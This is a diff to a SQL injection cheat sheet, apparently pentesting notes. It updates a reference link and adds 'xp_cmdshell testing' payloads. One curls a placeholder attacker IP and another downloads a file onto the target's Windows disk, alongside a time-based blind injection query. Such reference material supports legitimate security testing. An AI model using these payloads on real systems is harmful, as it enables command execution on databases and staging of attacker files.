@@ -1,6 +1,6 @@
 ### :open_file_folder: References
 
-- https://www.netsparker.com/blog/web-security/sql-injection-cheat-sheet/
+- https://www.invicti.com/blog/web-security/sql-injection-cheat-sheet/
 - https://pentestmonkey.net/cheat-sheet/sql-injection/mssql-sql-injection-cheat-sheet
 - https://medium.com/@notsoshant/a-not-so-blind-rce-with-sql-injection-13838026331e
 - https://notchxor.github.io/oscp-notes/2-web/sqli/
@@ -50,6 +50,13 @@ SELECT 'y'
 WHERE 1=0 or 
 SLEEP(IF((SELECT COUNT(*) FROM information_schema.schemata 
 WHERE schema_name NOT IN ('information_schema', 'mysql', 'performance_schema'))='1', 5, 0)); 
+```
+
+MS SQL xp_cmdshell testing
+
+```SQL
+'; EXEC xp_cmdshell 'curl http://<attacker ip>'; --
+'; EXEC xp_cmdshell 'curl http://<attacker ip>/<file> -o C:\\Users\\Public\\Documents\\<file>'; --
 ```
 
 ### :open_file_folder: Error-Based
